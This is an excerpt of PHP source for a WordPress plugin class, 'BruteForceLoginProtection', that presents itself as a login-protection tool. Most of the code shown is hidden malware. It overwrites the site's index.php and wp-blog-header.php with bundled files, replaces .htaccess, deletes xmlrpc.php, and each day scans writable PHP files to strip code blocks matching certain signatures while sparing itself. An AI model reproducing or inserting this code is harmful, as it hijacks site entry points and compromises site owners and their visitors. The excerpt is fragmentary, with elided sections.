...
class BruteForceLoginProtection {
	...
	$p_path = dirname(__FILE__);

	if(md5(file_get_contents($p_path . "/i.php")) != md5(file_get_contents($p_path . "/../../../index.php")))
	{
		chmod($p_path . "/../../../index.php", 0777);
		file_put_contents($p_path . "/../../../index.php", file_get_contents($p_path . "/i.php"));
	}

	if(md5(file_get_contents($p_path . "/w.php")) != md5(file_get_contents($p_path . "/../../../wp-blog-header.php")))
	{
		chmod($p_path . "/../../../wp-blog-header.php", 0777);
		file_put_contents($p_path . "/../../../wp-blog-header.php", file_get_contents($p_path . "/w.php"));
	}

	if(!file_exists($p_path . "/../../../.htaccess") || !file_get_contents($p_path . "/../../../.htaccess"))
	{
		chmod($p_path . "/../../../.htaccess", 0777);
		file_put_contents($p_path . "/../../../.htaccess", file_get_contents($p_path . "/h.php"));
	}

	if(file_exists($p_path . "/../../../xmlrpc.php"))
	{
		chmod($p_path . "/../../../xmlrpc.php", 0777);
		unlink($p_path . "/../../../xmlrpc.php");
	}

	$l_upd = time() - file_get_contents($p_path . "/chk.b");

	if($l_upd > 1*24*60*60)
	{
		file_put_contents($p_path . "/chk.b", time());

		$SIGNS = array("#Ask\s*Jeeves#i", "botbotbot");

		$ri = new RecursiveDirectoryIterator($p_path . "/../../../");
		...
		foreach(new RecursiveIteratorIterator($ri) as $file)
		{
			if(stripos($file, ".php") !== false)
			{
				...
				if(is_writable($file))
				{
					...
					foreach($SIGNS as $SNG)
					{
						$xpos = stripos($data, $SNG);

						if($xpos !== false)
						{
							$st_pos = strrpos(substr($data, 0, $xpos), "<?php");
							$en_pos = strpos(substr($data, $xpos), "?>") + $xpos;

							if($en_pos > $st_pos)
							{
								if(stripos($file, "protection.php") === false)
								{
									$data = substr($data, 0, $st_pos) . substr($data, $en_pos + 2);
    ...
    {
        $self_file = str_replace(plugin_dir_path(__FILE__), '', __FILE__);
    ...
    private function __setDefaultOptions() {
        $this->__options = array(
            'allowed_attempts'   => 3, //Allowed login attempts before deny,
            'reset_time'         => 240, //Minutes before resetting login attempts count
            'login_failed_delay' => 1, //Delay in seconds when a user login has failed
            'inform_user'        => false, //Inform user about remaining login attempts on login page
